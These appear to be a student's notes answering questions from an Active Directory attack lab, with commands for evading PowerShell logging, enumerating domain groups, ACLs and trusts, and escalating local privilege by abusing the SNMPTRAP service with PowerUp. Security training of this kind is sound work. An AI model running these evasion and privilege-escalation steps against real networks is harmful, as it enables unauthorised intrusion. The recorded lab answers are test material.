## 1. SID of the member of the Enterprise Admins group
- Avoid enhance script logging
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
 Import-Module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```

```powershell
Import-Module C:\AD\Tools\ADModule-
master\ActiveDirectory\ActiveDirectory.psd1
```
_We need to query the root domain as Enterprise Admins group is present only in the root of a forest._
```powershell
get-domaingroupmemeber "Enterprise Admins" -Domain moneycorp.local
```
#### Important enumerated Data
__Domain Admins__
- Administrator
- svc_admin

__Forests__
- moneycorp.local
-  eu.eurocorp.local 

__Domains & DC__
- moneycorp.local :  mcorp-dc.moneycorp.local [172.16.1.1]
- \*dollarcorp.moneycorp.local :  dcorp-dc.dollarcorp.moneycorp.local [172.16.2.1]
- us.dollarcorp.moneycorp.local :  us-dc.us.dollarcorp.moneycorp.local [172.16.9.1]
- eurocorp.local :  eurocorp-dc.eurocorp.local [ 172.16.15.1]
- eu.eurocorp.local : 

##### Ans
```txt
 S-1-5-21-335606122-960912869-3279953914-500
```

---
## 2. Display name of the GPO applied on StudentMachines OU
- Find GP link
```powershell
(get-domainou studenmachines).gplink
```
- Copy the above gplink like below
```powershell
get-domainGPO '{7478F170-6A0C-490C-B355-9E4618BC785D}'
```
- To know to which computer the GPO applies:
```powershell
 (get-domainou | ?{ $_.name -like "StudentMachines"}).distinguishedname | %{Get-DomainComputer -searchbase $_} | select name
```
##### Ans
```txt
Students
```
---
## 3. ActiveDirectory Rights for RDPUsers group on the users named ControlxUser

- Groups of control30user
```powershell
 Get-DomainGroup -userName control30user
```
- convert rdpuser to sid
```powershell
 $sid = ConvertTo-SID rdpusers
```
- what rights does rdpusers have on control30user
```powershell
Get-DomainObjectAcl "control30user" -ResolveGUIDs  | ? {$_.securityidentifier -eq $sid}
```
- PowerView:
```powershell
Find-InterestingDomainAcl -ResolveGUIDs |
?{$_.IdentityReferenceName -match "RDPUsers"}
```
---
## 4. Trust Direction for the trust between dollarcorp.moneycorp.local and eurocorp.local
```powershell
get-domaintrustmapping
```
```powershell
get-domaintrust
```
---
## 5. Service abused on the student VM for local privilege escalation
```powershell
. .\PowerUp.ps1
```

```powershell
Get-ModifiableService
```

```powershell
 Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName student30
```
- Verify administrators
```powershell
 net localgroup administrators
```

---
## 6. Script used for hunting for admin privileges using PowerShell Remoting




---
## 7. Jenkins user used to access Jenkins web console

--
## 8. Domain user used for running Jenkins service on dcorp-ci